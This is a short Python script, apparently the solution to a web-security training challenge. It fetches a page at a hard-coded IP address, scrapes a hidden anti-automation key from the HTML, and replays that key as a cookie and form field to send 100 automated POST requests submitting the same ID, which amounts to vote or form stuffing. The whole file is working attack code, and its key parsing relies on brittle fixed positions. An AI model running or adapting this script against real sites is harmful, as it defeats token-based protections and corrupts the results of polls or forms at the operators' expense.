#!/usr/bin/python3
import requests
import logging

def found_key(page, log):
    """Function that founds the value of the hidden key"""
    key = ""
    count = 0
    for fragment in page:
        if count == 2:  
            break
        count += 1
    search = fragment.split()
    count = 0 
    for value in search:
        if count == 8:
            key = str(value)
            break
        count += 1
    key = key[9:-2]
    log.info("The key was founded and is {}".format(key))
    return key

def init_logger():
    """Initialize a logger for info control"""
    LOG_FORMAT = "%(message)s"
    logging.basicConfig(filename = "Control.log", level = logging.DEBUG, format = LOG_FORMAT, filemode = "w")
    logger = logging.getLogger()
    return logger

log = init_logger()
url = "http://158.69.76.135/level1.php"
page = requests.get(url)
key = found_key(page, log)
header_key = {"Cookie":"HoldTheDoor={}".format(key)}
data_key = {"id":"2277", "holdthedoor":"Submit+Query", "key":key}
status_flag = ""
print("Sending requests....")
for i in range(100):
    try:
        requests.post(url, data = data_key, headers = header_key)
        log.info("Success")
    except:
        log.info("Fail")
print("Finish")
